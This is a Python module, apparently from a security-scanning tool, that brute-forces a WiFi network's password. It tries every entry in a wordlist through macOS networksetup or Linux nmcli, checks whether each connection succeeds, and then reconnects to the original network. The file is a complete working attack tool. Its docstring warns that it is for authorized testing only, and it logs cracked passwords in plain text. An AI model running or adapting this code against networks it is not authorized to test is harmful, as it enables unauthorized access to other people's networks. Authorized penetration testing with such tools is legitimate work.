"""WiFi online brute-force attack — authorized testing only.

Tries to connect to a target SSID using each password from a wordlist via
macOS networksetup. No monitor mode or special hardware required.

LIMITATIONS:
  - ~8–15 seconds per attempt (OS connection handshake)
  - Temporarily disconnects from the current WiFi during each attempt
  - Only works on macOS; Linux support via nmcli is included as fallback

USE ONLY AGAINST NETWORKS YOU OWN OR HAVE EXPLICIT WRITTEN PERMISSION TO TEST.
"""

from __future__ import annotations

import logging
import platform
import subprocess
import time
from collections.abc import Callable
from dataclasses import dataclass, field
from pathlib import Path

logger = logging.getLogger("webscanner.wifi.online_attack")

_DEFAULT_MAX_ATTEMPTS = 50
_CONNECT_WAIT_SECONDS = 10   # seconds to wait after connection attempt
_INTERFACE_MACOS = "en0"


@dataclass(frozen=True)
class OnlineAttackResult:
    """Immutable result from a WiFi online brute-force attempt."""

    ssid: str
    password_found: bool
    password: str
    attempts: int
    duration_seconds: float
    wordlist_used: str
    error: str | None = None


# ---------------------------------------------------------------------------
# Public API
# ---------------------------------------------------------------------------

def online_attack(
    ssid: str,
    wordlist: Path | None = None,
    max_attempts: int = _DEFAULT_MAX_ATTEMPTS,
    interface: str = _INTERFACE_MACOS,
    on_progress: Callable[[int, str], None] | None = None,
    on_log: Callable[[str], None] | None = None,
) -> OnlineAttackResult:
    """Attempt to connect to `ssid` using each password in `wordlist`.

    Restores the original WiFi connection when finished (success or failure).

    Args:
        ssid:         Target WiFi network name.
        wordlist:     Path to a password file (one password per line).
        max_attempts: Maximum number of passwords to try.
        interface:    WiFi interface name (default en0 on macOS).

    Returns:
        OnlineAttackResult with password if found.
    """
    def emit(pct: int, msg: str) -> None:
        if on_progress:
            on_progress(pct, msg)

    def log(msg: str) -> None:
        if on_log:
            on_log(msg)

    if platform.system() not in ("Darwin", "Linux"):
        return OnlineAttackResult(
            ssid=ssid, password_found=False, password="",
            attempts=0, duration_seconds=0.0,
            wordlist_used=str(wordlist or ""),
            error="Online WiFi attack only supported on macOS and Linux.",
        )

    if not ssid or ssid in ("<redacted>", "<hidden>"):
        return OnlineAttackResult(
            ssid=ssid, password_found=False, password="",
            attempts=0, duration_seconds=0.0,
            wordlist_used=str(wordlist or ""),
            error=(
                "Target SSID is '<redacted>' — macOS is hiding network names. "
                "Enable Location Services for Terminal in System Settings → "
                "Privacy & Security → Location Services, then re-scan."
            ),
        )

    # Resolve wordlist
    wl_path = _resolve_wordlist(wordlist)
    if wl_path is None:
        return OnlineAttackResult(
            ssid=ssid, password_found=False, password="",
            attempts=0, duration_seconds=0.0,
            wordlist_used=str(wordlist or "built-in"),
            error="No wordlist found. Run: webscanner wordlists",
        )

    # Save current connection so we can restore it
    emit(0, f"Starting attack on '{ssid}'…")
    original_ssid = _get_current_ssid(interface)
    logger.info(
        "Starting online attack against '%s'. Original network: '%s'",
        ssid, original_ssid or "none",
    )
    emit(5, f"Current network: '{original_ssid or 'none'}' — will restore after attack")

    started = time.monotonic()
    attempts = 0

    try:
        passwords = _load_passwords(wl_path, max_attempts)
        total = len(passwords)
        emit(10, f"Loaded {total} password(s) from {wl_path.name} (max: {max_attempts})")
        log(f"Wordlist: {wl_path}")
        log(f"Interface: {interface}")

        for password in passwords:
            attempts += 1
            pct = 10 + int(attempts / total * 78)  # 10–88% during attempts
            masked = password[:2] + "*" * max(0, len(password) - 4) + password[-2:] if len(password) > 4 else "***"
            emit(pct, f"Attempt {attempts}/{total} — trying: {masked}")
            logger.debug("[%d] Trying password: %s", attempts, password)

            success = _try_connect(ssid, password, interface)
            if success:
                duration = time.monotonic() - started
                logger.info("Password found after %d attempts: %s", attempts, password)
                emit(95, f"✓ Password found after {attempts} attempt(s): {password}")
                return OnlineAttackResult(
                    ssid=ssid,
                    password_found=True,
                    password=password,
                    attempts=attempts,
                    duration_seconds=duration,
                    wordlist_used=str(wl_path),
                )

    except KeyboardInterrupt:
        logger.info("Attack interrupted by user after %d attempts.", attempts)
        emit(90, f"Attack interrupted after {attempts} attempt(s)")
    finally:
        # Always restore original connection
        if original_ssid:
            emit(92, f"Restoring connection to '{original_ssid}'…")
            logger.info("Restoring connection to '%s'...", original_ssid)
            _restore_connection(original_ssid, interface)
            emit(96, f"Connection restored to '{original_ssid}'")

    duration = time.monotonic() - started
    emit(100, f"Attack complete — password not found after {attempts} attempt(s) ({duration:.0f}s)")
    return OnlineAttackResult(
        ssid=ssid,
        password_found=False,
        password="",
        attempts=attempts,
        duration_seconds=duration,
        wordlist_used=str(wl_path),
    )


# ---------------------------------------------------------------------------
# Internal helpers
# ---------------------------------------------------------------------------

def _resolve_wordlist(wordlist: Path | None) -> Path | None:
    """Return the wordlist path to use, or None if nothing found."""
    if wordlist and wordlist.exists():
        return wordlist

    # Default search order
    candidates = [
        Path("wordlists/wifi-passwords.txt"),
        Path("wordlists/common_passwords.txt"),
    ]
    for c in candidates:
        if c.exists():
            return c
    return None


def _load_passwords(path: Path, limit: int) -> list[str]:
    """Read up to `limit` non-empty passwords from the wordlist."""
    passwords: list[str] = []
    with open(path, encoding="utf-8", errors="ignore") as f:
        for line in f:
            pwd = line.strip()
            if pwd and not pwd.startswith("#"):
                passwords.append(pwd)
            if len(passwords) >= limit:
                break
    return passwords


def _get_current_ssid(interface: str) -> str | None:
    """Return current connected SSID, or None."""
    if platform.system() == "Darwin":
        try:
            proc = subprocess.run(
                ["networksetup", "-getairportnetwork", interface],
                capture_output=True, text=True, timeout=5,
            )
            line = proc.stdout.strip()
            if "Current Wi-Fi Network: " in line:
                return line.split("Current Wi-Fi Network: ", 1)[1].strip()
        except Exception:
            pass
    elif platform.system() == "Linux":
        try:
            proc = subprocess.run(
                ["nmcli", "-t", "-f", "active,ssid", "dev", "wifi"],
                capture_output=True, text=True, timeout=5,
            )
            for line in proc.stdout.splitlines():
                if line.startswith("yes:"):
                    return line.split(":", 1)[1]
        except Exception:
            pass
    return None


def _try_connect(ssid: str, password: str, interface: str) -> bool:
    """Try to connect to `ssid` with `password`. Returns True on success."""
    if platform.system() == "Darwin":
        return _try_connect_macos(ssid, password, interface)
    return _try_connect_linux(ssid, password)


def _try_connect_macos(ssid: str, password: str, interface: str) -> bool:
    """macOS: use networksetup to attempt connection."""
    try:
        proc = subprocess.run(
            ["networksetup", "-setairportnetwork", interface, ssid, password],
            capture_output=True, text=True, timeout=30,
        )
        if proc.returncode != 0:
            return False

        # Wait for connection handshake
        time.sleep(_CONNECT_WAIT_SECONDS)

        # Verify we are now connected to the target SSID
        connected_ssid = _get_current_ssid(interface)
        return connected_ssid == ssid

    except subprocess.TimeoutExpired:
        return False
    except Exception as exc:
        logger.debug("Connection attempt error: %s", exc)
        return False


def _try_connect_linux(ssid: str, password: str) -> bool:
    """Linux: use nmcli to attempt connection."""
    try:
        proc = subprocess.run(
            ["nmcli", "dev", "wifi", "connect", ssid, "password", password],
            capture_output=True, text=True, timeout=30,
        )
        return proc.returncode == 0

    except subprocess.TimeoutExpired:
        return False
    except Exception as exc:
        logger.debug("Connection attempt error: %s", exc)
        return False


def _restore_connection(original_ssid: str, interface: str) -> None:
    """Reconnect to the original network (best effort)."""
    if platform.system() == "Darwin":
        try:
            subprocess.run(
                ["networksetup", "-setairportnetwork", interface, original_ssid],
                capture_output=True, timeout=30,
            )
            time.sleep(3)
        except Exception:
            pass
    elif platform.system() == "Linux":
        try:
            subprocess.run(
                ["nmcli", "dev", "wifi", "connect", original_ssid],
                capture_output=True, timeout=30,
            )
        except Exception:
            pass
